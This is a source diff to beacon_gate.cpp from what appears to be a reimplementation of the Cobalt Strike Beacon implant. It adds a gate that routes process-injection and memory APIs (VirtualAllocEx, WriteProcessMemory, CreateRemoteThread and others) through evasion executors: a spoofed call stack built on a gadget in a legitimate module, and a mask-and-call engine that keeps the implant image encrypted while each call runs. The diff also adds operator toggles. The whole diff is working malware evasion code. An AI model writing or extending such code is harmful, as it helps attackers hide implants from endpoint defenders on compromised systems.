@@ -1,12 +1,17 @@
-/* beacon_gate.cpp - C-58 BeaconGate (4.10 parity)
+/* beacon_gate.cpp - BeaconGate (4.10 parity)
  *
- * Official contract (4.10 blog, FUNCTION_CALL): when BeaconGate is enabled
- * for a supported API, Beacon packs the call into a FUNCTION_CALL
- * {functionPtr, function enum, numOfArgs, args[], bMask, retValue} and
- * hands it to the gate executor. Our executor has two tiers:
+ * Official contract (4.10 blog, arsenal-kit beacon_gate.[ch]): when
+ * BeaconGate is enabled for a supported API, Beacon packs the call into a
+ * FUNCTION_CALL {functionPtr, function, numOfArgs, args[], bMask, retValue}
+ * and hands it to the gate executor. The executor is the sleepmask, and
+ * there are three of them:
  *
- *   1. plain (default): generic N-arg dispatch.
- *   2. spoofed (opt-in, GATE_MODE_SPOOF): the call executes on a private
+ *   1. a user sleepmask BOF (gate_set_executor): it receives every gated
+ *      call - and the sleep itself - and decides how to run it. bMask is
+ *      its input, not an order.
+ *   2. the built-in executor (default): bMask runs the call with the beacon
+ *      image masked (mask-and-call), otherwise plain dispatch.
+ *   3. spoofed (opt-in, GATE_MODE_SPOOF): the call executes on a private
  *      fake stack; an `add rsp, imm8; ret` gadget in a legit module is the
  *      callee's return address and hops back to the recovery stub with RAX
  *      intact.
@@ -16,23 +21,30 @@
  * it is incompatible with CET shadow stacks, and its fake-stack page is a
  * process-wide singleton. It stays one flag away for research use.
  *
- * Any init failure (no gadget, gen3 frames unavailable, x86) degrades to
- * plain dispatch - the gate never breaks the call.
+ * bMask follows the manual (p.279): a proxied API is masked by default.
+ * The built-in mask switches itself off when Beacon is interactive
+ * (sleep < 3s, to avoid the CPU spike), while worker threads run, after
+ * BeaconDisableBeaconGateMasking(), and for CreateThread - the started
+ * thread may execute beacon code while the image is ciphertext.
+ *
+ * Any init failure (no gadget, gen3 frames unavailable, mask engine
+ * unavailable, x86) degrades to the next executor - the gate never breaks
+ * the call.
  */
 
 #include <windows.h>
+#include <stdarg.h>
 #include <string.h>
 #include "beacon.h"
+#include "gargleint.h" /* threadcount */
 #include "commands.h"
 #include "sleepmask_gen3.h"
+#if defined(_M_X64) && defined(BOFWIN_ENABLE)
+#include "sleepmask_bofwin.h" /* the mask engine (rl0k sleeve only) */
+#endif
 #include "beacon_gate.h"
 #include "parse.h" /* datap/data_int (cmd 123 payload) */
 #include "spawn_trace.h" /* spawn_log (probe) */
-
-/* settings 96 = per-API bitmask; 97 = mode flags */
-#define GATE_MODE_ALL             (1 << 0)
-/* GATE_MODE_SPOOF (bit1): opt-in switch for the spoofed executor. */
-#define GATE_MODE_SPOOF           (1 << 1)
 
 /* offsets mirror gate_spoof.asm exactly */
 typedef struct {
@@ -64,21 +76,61 @@ static unsigned long long g_gate_gadget;
 static unsigned long    g_gate_hop;   /* 8 + gadget imm8: recovery slot offset */
 static volatile long    g_gate_spoof_ready; /* 0=unknown, 1=ready, 2=plain */
 
+static GATE_EXECUTOR g_gate_executor; /* user sleepmask BOF, or NULL */
+static int           g_gate_busy;     /* re-entrancy guard (see gate_dispatch) */
+static int           g_gate_off;      /* BeaconDisableBeaconGate() */
+static int           g_gate_mask_off; /* BeaconDisableBeaconGateMasking() */
+
+/* if an API hangs, the mask engine's watchdog unmasks after this and the
+ * call just keeps running unmasked */
+#define GATE_MASK_WATCHDOG_MS 60000
+
 /* ---------------- gate enablement ---------------- */
 
 int gate_enabled(void)
 {
-	return setting_int(SETTING_BEACON_GATE_API) != 0
-	    || setting_int(SETTING_BEACON_GATE_MODE) != 0;
+	return g_gate_off == 0
+	    && (setting_int(SETTING_BEACON_GATE_API) != 0
+	    || setting_int(SETTING_BEACON_GATE_MODE) != 0);
 }
 
-int gate_api_enabled(int api_bit)
+int gate_api_enabled(int api)
 {
+#if !defined(_M_X64)
+	(void)api;
+	return 0; /* the executors are x64 only; the wrappers stay the plain API */
+#else
 	if (!gate_enabled())
 		return 0;
 	if (setting_int(SETTING_BEACON_GATE_MODE) & GATE_MODE_ALL)
 		return 1;
-	return (setting_int(SETTING_BEACON_GATE_API) & api_bit) != 0;
+	return (setting_int(SETTING_BEACON_GATE_API) & GATE_BIT(api)) != 0;
+#endif
+}
+
+void gate_set_executor(GATE_EXECUTOR executor)
+{
+	g_gate_executor = executor;
+}
+
+void BeaconDisableBeaconGate(void)
+{
+	g_gate_off = 1;
+}
+
+void BeaconEnableBeaconGate(void)
+{
+	g_gate_off = 0;
+}
+
+void BeaconDisableBeaconGateMasking(void)
+{
+	g_gate_mask_off = 1;
+}
+
+void BeaconEnableBeaconGateMasking(void)
+{
+	g_gate_mask_off = 0;
 }
 
 /* ---------------- spoof tier init (x64) ---------------- */
@@ -184,10 +236,10 @@ static void gate_init_spoof(void)
 	 * value matches what gate_spoof_recovery expects. */
 	/* pivot near the top: 252KB of headroom below for the gated call's
 	 * tree, chain + parked recovery laid above toward the page end */
-		/* pivot + 8: x64 ABI expects rsp==8 (mod 16) at fn ENTRY (a real call
+	/* pivot + 8: x64 ABI expects rsp==8 (mod 16) at fn ENTRY (a real call
 	 * pushes an 8-byte retaddr onto an aligned rsp) - jmp does not push,
 	 * so the pivot itself must carry the +8. Misaligned entry killed
-	 * InternetOpenA's tree at WININET!_tailMerge_iertutil_dll movdqa. */
+	 * WININET!_tailMerge_iertutil_dll movdqa in InternetOpenA's tree. */
 	g_gate_pivot = (unsigned long long)g_gate_page + 0x3f008;
 	slot = g_gate_pivot + 0x80; /* above the parked recovery slot */
 	if (slot + 0x300 > g_gate_pivot + 0x1000) { /* chain must fit the top margin */
@@ -207,29 +259,28 @@ static void gate_init_spoof(void)
 
 #endif /* _M_X64 (spoof tier) */
 
-/* ---------------- executor (common) ---------------- */
+/* ---------------- executors ---------------- */
+
+/* one cast per arity: an exact call, never a wider one */
+#define GATE_U unsigned long long
 
 static unsigned long long gate_exec_plain(FUNCTION_CALL * fc)
 {
-	typedef unsigned long long (WINAPI * G0)();
-	typedef unsigned long long (WINAPI * G1)(unsigned long long);
-	typedef unsigned long long (WINAPI * G2)(unsigned long long, unsigned long long);
-	typedef unsigned long long (WINAPI * G3)(unsigned long long, unsigned long long, unsigned long long);
-	typedef unsigned long long (WINAPI * G4)(unsigned long long, unsigned long long, unsigned long long, unsigned long long);
-	typedef unsigned long long (WINAPI * G8)(unsigned long long, unsigned long long, unsigned long long, unsigned long long,
-	                                         unsigned long long, unsigned long long, unsigned long long, unsigned long long);
+	void * f = fc->functionPtr;
+	GATE_U * a = fc->args;
 
 	switch (fc->numOfArgs) {
-	case 0:  return ((G0)fc->functionPtr)();
-	case 1:  return ((G1)fc->functionPtr)(fc->args[0]);
-	case 2:  return ((G2)fc->functionPtr)(fc->args[0], fc->args[1]);
-	case 3:  return ((G3)fc->functionPtr)(fc->args[0], fc->args[1], fc->args[2]);
-	case 4:  return ((G4)fc->functionPtr)(fc->args[0], fc->args[1], fc->args[2], fc->args[3]);
-	default:
-		/* x64 WinAPI: extra stack slots are caller-owned and ignored by
-		 * fixed-arg callees - the 8-arg cast is safe for our API set */
-		return ((G8)fc->functionPtr)(fc->args[0], fc->args[1], fc->args[2], fc->args[3],
-		                             fc->args[4], fc->args[5], fc->args[6], fc->args[7]);
+	case 0:  return ((unsigned long long (WINAPI *)())f)();
+	case 1:  return ((unsigned long long (WINAPI *)(GATE_U))f)(a[0]);
+	case 2:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U))f)(a[0], a[1]);
+	case 3:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2]);
+	case 4:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3]);
+	case 5:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4]);
+	case 6:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5]);
+	case 7:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6]);
+	case 8:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
+	case 9:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8]);
+	default: return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9]);
 	}
 }
 
@@ -238,107 +289,313 @@ extern "C" void gate_spoof_probe(unsigned long long fn) /* asm calls the bare sy
 	spawn_log(gate_spoof_probe_tag, (long)fn);
 }
 
+/* when a call may be handed over with bMask set. The built-in mask engine
+ * has one more rule (see gate_mask_allowed). */
+static int gate_mask_allowed(int api)
+{
+	if (g_gate_mask_off || threadcount > 0)
+		return 0;
+	/* the gate mask is the sleep mask's job - no sleep mask, no gate mask */
+	if (setting_int(SETTING_GARGLE_NOOK) == 0)
+		return 0;
+	/* interactive Beacon skips the mask: it would only spin CPU (manual
+	 * p.279). The one-shot exit is not interactive traffic - it keeps the
+	 * scrub. */
+	if (api != GATE_API_EXITTHREAD && setting_int(SETTING_SLEEPTIME) < 3000)
+		return 0;
+	return 1;
+}
+
+/* the built-in mask engine runs the whole call with the image ciphertext,
+ * so nothing of ours may execute in this process until it returns */
+static int gate_mask_run(FUNCTION_CALL * fc)
+{
+#if defined(_M_X64) && defined(BOFWIN_ENABLE)
+	/* ExitThread never returns: no watchdog, or its timer thread would put
+	 * the image back in plaintext right after the session died */
+	int served = bofwin_call((void *)fc->functionPtr, fc->args, fc->numOfArgs, &fc->retValue,
+	                         fc->function == GATE_API_EXITTHREAD ? 0 : GATE_MASK_WATCHDOG_MS);
+	KD(served ? "gate: masked api=" : "gate: mask unserved api=", fc->function);
+	return served;
+#else
+	(void)fc;
+	return 0; /* no engine in this build (the TS-slot DLL, x86) */
+#endif
+}
+
 unsigned long long gate_dispatch(FUNCTION_CALL * fc)
 {
-#if defined(_M_X64)
-	GATE_SPOOFCTX ctx;
-	int i;
+	int done = 0;
 
-	/* the spoofed executor is opt-in (setting 97 bit 1); init failure
-	 * degrades to plain dispatch */
-	if (g_gate_spoof_ready == 0 && (setting_int(SETTING_BEACON_GATE_MODE) & GATE_MODE_SPOOF))
-		gate_init_spoof();
+	if (fc->numOfArgs > MAX_BEACON_GATE_ARGUMENTS)
+		fc->numOfArgs = MAX_BEACON_GATE_ARGUMENTS;
 
-	if (g_gate_spoof_ready == 1) {
-		memset(&ctx, 0, sizeof(ctx));
-		ctx.fn       = (unsigned long long)fc->functionPtr;
-		ctx.recovery = (unsigned long long)&gate_spoof_recovery;
-		ctx.gadget   = g_gate_gadget;
-		ctx.fake_rsp = g_gate_pivot;
-		for (i = 0; i < 4 && i < fc->numOfArgs; i++)
-			ctx.args[i] = fc->args[i];
-		/* add-rsp hop: park the recovery address above the 8-arg stack
-		 * block; the gadget skips the dead shadow+args area and rets here
-		 * (rbp survives the call = ctx+0x10, as the asm prologue set it) */
-		*(unsigned long long *)(g_gate_pivot + g_gate_hop) =
-			(unsigned long long)&gate_spoof_recovery;
-		/* stack args 5..8 pre-lay into the fake frame's arg area */
-		for (i = 4; i < fc->numOfArgs && i < 8; i++)
-			*(unsigned long long *)(g_gate_pivot + 0x28 + 8 * (i - 4)) = fc->args[i];
-		fc->retValue = gate_spoof_execute(&ctx);
+	/* a call made from inside an executor (the mask engine's teardown,
+	 * code a user sleepmask ran) must not re-enter it */
+	if (g_gate_busy) {
+		fc->retValue = gate_exec_plain(fc);
 		return fc->retValue;
 	}
+
+	g_gate_busy = 1;
+	KD("gate: call api=", fc->function);
+	fc->bMask = fc->bMask && gate_mask_allowed(fc->function);
+
+	if (g_gate_executor != NULL) {
+		g_gate_executor(fc);
+		done = 1;
+	}
+#if defined(_M_X64)
+	else {
+		GATE_SPOOFCTX ctx;
+		int i;
+
+		/* the spoofed executor is opt-in (setting 97 bit 1); init failure
+		 * degrades to the next executor */
+		if (g_gate_spoof_ready == 0 && (setting_int(SETTING_BEACON_GATE_MODE) & GATE_MODE_SPOOF))
+			gate_init_spoof();
+
+		if (g_gate_spoof_ready == 1) {
+			memset(&ctx, 0, sizeof(ctx));
+			ctx.fn       = (unsigned long long)fc->functionPtr;
+			ctx.recovery = (unsigned long long)&gate_spoof_recovery;
+			ctx.gadget   = g_gate_gadget;
+			ctx.fake_rsp = g_gate_pivot;
+			for (i = 0; i < 4 && i < fc->numOfArgs; i++)
+				ctx.args[i] = fc->args[i];
+			/* add-rsp hop: park the recovery address above the 8-arg stack
+			 * block; the gadget skips the dead shadow+args area and rets here
+			 * (rbp survives the call = ctx+0x10, as the asm prologue set it) */
+			*(unsigned long long *)(g_gate_pivot + g_gate_hop) =
+				(unsigned long long)&gate_spoof_recovery;
+			/* stack args 5..8 pre-lay into the fake frame's arg area */
+			for (i = 4; i < fc->numOfArgs && i < 8; i++)
+				*(unsigned long long *)(g_gate_pivot + 0x28 + 8 * (i - 4)) = fc->args[i];
+			fc->retValue = gate_spoof_execute(&ctx);
+			done = 1;
+		}
+		else if (fc->bMask && fc->function != GATE_API_CREATETHREAD && gate_mask_run(fc)) {
+			/* CreateThread is left out: the new thread may run beacon code
+			 * (the CFG-safe trampoline calls back into the image) while the
+			 * image is ciphertext */
+			done = 1;
+		}
+	}
 #endif
-	/* the plain executor has no init step, so this probe is the only on-target
-	 * sign that a call went through the gate (the spoof probes above only
-	 * fire on the opt-in tier; value = GATE_API_* bit) */
-	KD("gate: plain api=", fc->function);
-	fc->retValue = gate_exec_plain(fc);
+	if (!done)
+		fc->retValue = gate_exec_plain(fc);
+
+	g_gate_busy = 0;
 	return fc->retValue;
 }
 
-/* ---------------- gate wrappers (call-site funnels) ---------------- */
+unsigned long long gate_call(void * fn, int api, int n, ...)
+{
+	FUNCTION_CALL fc;
+	va_list ap;
+	int i;
+
+	memset(&fc, 0, sizeof(fc));
+	fc.functionPtr = fn;
+	fc.function    = api;
+	fc.numOfArgs   = n;
+	fc.bMask       = TRUE;
+	va_start(ap, n);
+	for (i = 0; i < n && i < MAX_BEACON_GATE_ARGUMENTS; i++)
+		fc.args[i] = va_arg(ap, unsigned long long);
+	va_end(ap);
+	return gate_dispatch(&fc);
+}
+
+#define GATE_PTR(p) ((unsigned long long)(ULONG_PTR)(p))
+
+/* ---------------- gate wrappers ----------------
+ * Each one is the API with the gate in front: off -> the plain call.
+ * Every argument is widened to unsigned long long before gate_call:
+ * a 32-bit value passed through `...` is only guaranteed in the low
+ * half of its slot. */
 
 LPVOID gate_VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD protect)
 {
-	FUNCTION_CALL fc = {0};
-	fc.functionPtr = (void *)VirtualAlloc;
-	fc.function    = GATE_API_VIRTUALALLOC;
-	fc.numOfArgs   = 4;
-	fc.args[0] = (unsigned long long)addr;
-	fc.args[1] = (unsigned long long)size;
-	fc.args[2] = (unsigned long long)type;
-	fc.args[3] = (unsigned long long)protect;
-	return (LPVOID)gate_dispatch(&fc);
+	if (!gate_api_enabled(GATE_API_VIRTUALALLOC))
+		return VirtualAlloc(addr, size, type, protect);
+	return (LPVOID)(ULONG_PTR)gate_call((void *)VirtualAlloc, GATE_API_VIRTUALALLOC, 4,
+		GATE_PTR(addr), (unsigned long long)(size),
+		(unsigned long long)(type), (unsigned long long)(protect));
 }
 
 LPVOID gate_VirtualAllocEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD type, DWORD protect)
 {
-	FUNCTION_CALL fc = {0};
-	HMODULE k32 = GetModuleHandleA("kernel32.dll");
-	FARPROC fn = k32 ? GetProcAddress(k32, "VirtualAllocEx") : NULL;
-	if (fn == NULL)
+	if (!gate_api_enabled(GATE_API_VIRTUALALLOCEX))
 		return VirtualAllocEx(proc, addr, size, type, protect);
-	fc.functionPtr = (void *)fn;
-	fc.function    = GATE_API_VIRTUALALLOCEX;
-	fc.numOfArgs   = 5;
-	fc.args[0] = (unsigned long long)proc;
-	fc.args[1] = (unsigned long long)addr;
-	fc.args[2] = (unsigned long long)size;
-	fc.args[3] = (unsigned long long)type;
-	fc.args[4] = (unsigned long long)protect;
-	return (LPVOID)gate_dispatch(&fc);
+	return (LPVOID)(ULONG_PTR)gate_call((void *)VirtualAllocEx, GATE_API_VIRTUALALLOCEX, 5,
+		GATE_PTR(proc), GATE_PTR(addr), (unsigned long long)(size),
+		(unsigned long long)(type), (unsigned long long)(protect));
 }
 
 BOOL gate_VirtualProtect(LPVOID addr, SIZE_T size, DWORD protect, PDWORD old)
 {
-	FUNCTION_CALL fc = {0};
-	fc.functionPtr = (void *)VirtualProtect;
-	fc.function    = GATE_API_VIRTUALPROTECT;
-	fc.numOfArgs   = 4;
-	fc.args[0] = (unsigned long long)addr;
-	fc.args[1] = (unsigned long long)size;
-	fc.args[2] = (unsigned long long)protect;
-	fc.args[3] = (unsigned long long)old;
-	return (BOOL)gate_dispatch(&fc);
+	if (!gate_api_enabled(GATE_API_VIRTUALPROTECT))
+		return VirtualProtect(addr, size, protect, old);
+	return (BOOL)(ULONG_PTR)gate_call((void *)VirtualProtect, GATE_API_VIRTUALPROTECT, 4,
+		GATE_PTR(addr), (unsigned long long)(size),
+		(unsigned long long)(protect), GATE_PTR(old));
 }
 
 BOOL gate_VirtualProtectEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD protect, PDWORD old)
 {
-	FUNCTION_CALL fc = {0};
-	HMODULE k32 = GetModuleHandleA("kernel32.dll");
-	FARPROC fn = k32 ? GetProcAddress(k32, "VirtualProtectEx") : NULL;
-	if (fn == NULL)
+	if (!gate_api_enabled(GATE_API_VIRTUALPROTECTEX))
 		return VirtualProtectEx(proc, addr, size, protect, old);
-	fc.functionPtr = (void *)fn;
-	fc.function    = GATE_API_VIRTUALPROTECTEX;
-	fc.numOfArgs   = 5;
-	fc.args[0] = (unsigned long long)proc;
-	fc.args[1] = (unsigned long long)addr;
-	fc.args[2] = (unsigned long long)size;
-	fc.args[3] = (unsigned long long)protect;
-	fc.args[4] = (unsigned long long)old;
-	return (BOOL)gate_dispatch(&fc);
+	return (BOOL)(ULONG_PTR)gate_call((void *)VirtualProtectEx, GATE_API_VIRTUALPROTECTEX, 5,
+		GATE_PTR(proc), GATE_PTR(addr), (unsigned long long)(size),
+		(unsigned long long)(protect), GATE_PTR(old));
+}
+
+BOOL gate_VirtualFree(LPVOID addr, SIZE_T size, DWORD freetype)
+{
+	if (!gate_api_enabled(GATE_API_VIRTUALFREE))
+		return VirtualFree(addr, size, freetype);
+	return (BOOL)(ULONG_PTR)gate_call((void *)VirtualFree, GATE_API_VIRTUALFREE, 3,
+		GATE_PTR(addr), (unsigned long long)(size), (unsigned long long)(freetype));
+}
+
+SIZE_T gate_VirtualQuery(LPCVOID addr, PMEMORY_BASIC_INFORMATION mbi, SIZE_T len)
+{
+	if (!gate_api_enabled(GATE_API_VIRTUALQUERY))
+		return VirtualQuery(addr, mbi, len);
+	return (SIZE_T)(ULONG_PTR)gate_call((void *)VirtualQuery, GATE_API_VIRTUALQUERY, 3,
+		GATE_PTR(addr), GATE_PTR(mbi), (unsigned long long)(len));
+}
+
+HANDLE gate_OpenProcess(DWORD access, BOOL inherit, DWORD pid)
+{
+	if (!gate_api_enabled(GATE_API_OPENPROCESS))
+		return OpenProcess(access, inherit, pid);
+	return (HANDLE)(ULONG_PTR)gate_call((void *)OpenProcess, GATE_API_OPENPROCESS, 3,
+		(unsigned long long)(access), (unsigned long long)(inherit), (unsigned long long)(pid));
+}
+
+HANDLE gate_OpenThread(DWORD access, BOOL inherit, DWORD tid)
+{
+	if (!gate_api_enabled(GATE_API_OPENTHREAD))
+		return OpenThread(access, inherit, tid);
+	return (HANDLE)(ULONG_PTR)gate_call((void *)OpenThread, GATE_API_OPENTHREAD, 3,
+		(unsigned long long)(access), (unsigned long long)(inherit), (unsigned long long)(tid));
+}
+
+BOOL gate_CloseHandle(HANDLE h)
+{
+	if (!gate_api_enabled(GATE_API_CLOSEHANDLE))
+		return CloseHandle(h);
+	return (BOOL)(ULONG_PTR)gate_call((void *)CloseHandle, GATE_API_CLOSEHANDLE, 1,
+		GATE_PTR(h));
+}
+
+BOOL gate_DuplicateHandle(HANDLE sp, HANDLE sh, HANDLE tp, LPHANDLE th, DWORD access, BOOL inherit, DWORD options)
+{
+	if (!gate_api_enabled(GATE_API_DUPLICATEHANDLE))
+		return DuplicateHandle(sp, sh, tp, th, access, inherit, options);
+	return (BOOL)(ULONG_PTR)gate_call((void *)DuplicateHandle, GATE_API_DUPLICATEHANDLE, 7,
+		GATE_PTR(sp), GATE_PTR(sh), GATE_PTR(tp), GATE_PTR(th),
+		(unsigned long long)(access), (unsigned long long)(inherit), (unsigned long long)(options));
+}
+
+BOOL gate_ReadProcessMemory(HANDLE proc, LPCVOID base, LPVOID buf, SIZE_T n, SIZE_T * read)
+{
+	if (!gate_api_enabled(GATE_API_READPROCESSMEMORY))
+		return ReadProcessMemory(proc, base, buf, n, read);
+	return (BOOL)(ULONG_PTR)gate_call((void *)ReadProcessMemory, GATE_API_READPROCESSMEMORY, 5,
+		GATE_PTR(proc), GATE_PTR(base), GATE_PTR(buf),
+		(unsigned long long)(n), GATE_PTR(read));
+}
+
+BOOL gate_WriteProcessMemory(HANDLE proc, LPVOID base, LPCVOID buf, SIZE_T n, SIZE_T * written)
+{
+	if (!gate_api_enabled(GATE_API_WRITEPROCESSMEMORY))
+		return WriteProcessMemory(proc, base, buf, n, written);
+	return (BOOL)(ULONG_PTR)gate_call((void *)WriteProcessMemory, GATE_API_WRITEPROCESSMEMORY, 5,
+		GATE_PTR(proc), GATE_PTR(base), GATE_PTR(buf),
+		(unsigned long long)(n), GATE_PTR(written));
+}
+
+BOOL gate_GetThreadContext(HANDLE thread, CONTEXT * ctx)
+{
+	if (!gate_api_enabled(GATE_API_GETTHREADCONTEXT))
+		return GetThreadContext(thread, ctx);
+	return (BOOL)(ULONG_PTR)gate_call((void *)GetThreadContext, GATE_API_GETTHREADCONTEXT, 2,
+		GATE_PTR(thread), GATE_PTR(ctx));
+}
+
+BOOL gate_SetThreadContext(HANDLE thread, CONTEXT * ctx)
+{
+	if (!gate_api_enabled(GATE_API_SETTHREADCONTEXT))
+		return SetThreadContext(thread, ctx);
+	return (BOOL)(ULONG_PTR)gate_call((void *)SetThreadContext, GATE_API_SETTHREADCONTEXT, 2,
+		GATE_PTR(thread), GATE_PTR(ctx));
+}
+
+DWORD gate_ResumeThread(HANDLE thread)
+{
+	if (!gate_api_enabled(GATE_API_RESUMETHREAD))
+		return ResumeThread(thread);
+	return (DWORD)(ULONG_PTR)gate_call((void *)ResumeThread, GATE_API_RESUMETHREAD, 1,
+		GATE_PTR(thread));
+}
+
+HANDLE gate_CreateThread(LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD id)
+{
+	if (!gate_api_enabled(GATE_API_CREATETHREAD))
+		return CreateThread(sa, stack, start, param, flags, id);
+	return (HANDLE)(ULONG_PTR)gate_call((void *)CreateThread, GATE_API_CREATETHREAD, 6,
+		GATE_PTR(sa), (unsigned long long)(stack), GATE_PTR(start),
+		GATE_PTR(param), (unsigned long long)(flags), GATE_PTR(id));
+}
+
+HANDLE gate_CreateRemoteThread(HANDLE proc, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD id)
+{
+	if (!gate_api_enabled(GATE_API_CREATEREMOTETHREAD))
+		return CreateRemoteThread(proc, sa, stack, start, param, flags, id);
+	return (HANDLE)(ULONG_PTR)gate_call((void *)CreateRemoteThread, GATE_API_CREATEREMOTETHREAD, 7,
+		GATE_PTR(proc), GATE_PTR(sa), (unsigned long long)(stack), GATE_PTR(start),
+		GATE_PTR(param), (unsigned long long)(flags), GATE_PTR(id));
+}
+
+HANDLE gate_CreateFileMappingA(HANDLE file, LPSECURITY_ATTRIBUTES sa, DWORD protect, DWORD high, DWORD low, const char * name)
+{
+	if (!gate_api_enabled(GATE_API_CREATEFILEMAPPINGA))
+		return CreateFileMappingA(file, sa, protect, high, low, name);
+	return (HANDLE)(ULONG_PTR)gate_call((void *)CreateFileMappingA, GATE_API_CREATEFILEMAPPINGA, 6,
+		GATE_PTR(file), GATE_PTR(sa), (unsigned long long)(protect),
+		(unsigned long long)(high), (unsigned long long)(low), GATE_PTR(name));
+}
+
+LPVOID gate_MapViewOfFile(HANDLE map, DWORD access, DWORD high, DWORD low, SIZE_T size)
+{
+	if (!gate_api_enabled(GATE_API_MAPVIEWOFFILE))
+		return MapViewOfFile(map, access, high, low, size);
+	return (LPVOID)(ULONG_PTR)gate_call((void *)MapViewOfFile, GATE_API_MAPVIEWOFFILE, 5,
+		GATE_PTR(map), (unsigned long long)(access), (unsigned long long)(high),
+		(unsigned long long)(low), (unsigned long long)(size));
+}
+
+BOOL gate_UnmapViewOfFile(LPCVOID base)
+{
+	if (!gate_api_enabled(GATE_API_UNMAPVIEWOFFILE))
+		return UnmapViewOfFile(base);
+	return (BOOL)(ULONG_PTR)gate_call((void *)UnmapViewOfFile, GATE_API_UNMAPVIEWOFFILE, 1,
+		GATE_PTR(base));
+}
+
+void gate_ExitThread(DWORD exitcode)
+{
+	if (!gate_api_enabled(GATE_API_EXITTHREAD)) {
+		ExitThread(exitcode);
+		return;
+	}
+	/* the executor is expected to run the call; reaching the next line
+	 * means a user sleepmask declined it */
+	(void)gate_call((void *)ExitThread, GATE_API_EXITTHREAD, 1, (unsigned long long)exitcode);
+	ExitThread(exitcode);
 }
 
 /* ---------------- runtime toggle (command 123) ---------------- */
@@ -351,12 +608,14 @@ void command_beacon_gate(char * buffer, int length, void (*callback)(char * buff
 	data_init(&parser, buffer, length);
 	enable = data_int(&parser);
 
-	/* live settings-table rewrite: 0 = off, 1 = All (official command
-	 * semantic is enable/disable; All matches the "instrument everything"
-	 * bring-up use) */
-	setting_apply_int(SETTING_BEACON_GATE_MODE, enable ? GATE_MODE_ALL : 0);
-	if (!enable)
-		setting_apply_int(SETTING_BEACON_GATE_API, 0);
+	/* 0 = off, anything else = on. This is a switch over the profile's
+	 * configuration, not a rewrite of it: `beacon_gate disable` followed
+	 * by `beacon_gate enable` restores exactly what the profile asked for
+	 * (and leaves the sleep mask alone either way). */
+	if (enable)
+		BeaconEnableBeaconGate();
+	else
+		BeaconDisableBeaconGate();
 
 	callback((char *)"", 0, CALLBACK_OUTPUT);
 }
